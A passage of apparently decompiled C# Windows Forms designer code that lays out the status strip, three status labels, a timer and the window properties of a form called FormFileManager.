        (ToolStripItem) this.toolStripStatusLabel1,
        (ToolStripItem) this.toolStripStatusLabel2,
        (ToolStripItem) this.toolStripStatusLabel3
      });
      this.statusStrip1.Location = new Point(0, 513);
      this.statusStrip1.Name = "statusStrip1";
      this.statusStrip1.Size = new Size(1058, 32);
      this.statusStrip1.TabIndex = 2;
      this.statusStrip1.Text = "statusStrip1";
      this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
      this.toolStripStatusLabel1.Size = new Size(20, 25);
      this.toolStripStatusLabel1.Text = "..";
      this.toolStripStatusLabel2.Name = "toolStripStatusLabel2";
      this.toolStripStatusLabel2.Size = new Size(20, 25);
      this.toolStripStatusLabel2.Text = "..";
      this.toolStripStatusLabel3.ForeColor = Color.Red;
      this.toolStripStatusLabel3.Name = "toolStripStatusLabel3";
      this.toolStripStatusLabel3.Size = new Size(20, 25);
      this.toolStripStatusLabel3.Text = "..";
      this.timer1.Interval = 1000;
      this.timer1.Tick += new EventHandler(this.Timer1_Tick);
      this.AutoScaleDimensions = new SizeF(9f, 20f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(1058, 545);
      this.Controls.Add((Control) this.statusStrip1);
      this.Controls.Add((Control) this.listView1);
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (FormFileManager);
      this.Text = "FileManager";
      this.FormClosed += new FormClosedEventHandler(this.FormFileManager_FormClosed);
      this.contextMenuStrip1.ResumeLayout(false);
      this.statusStrip1.ResumeLayout(false);
      this.statusStrip1.PerformLayout();
      this.ResumeLayout(false);
    }
  }
}
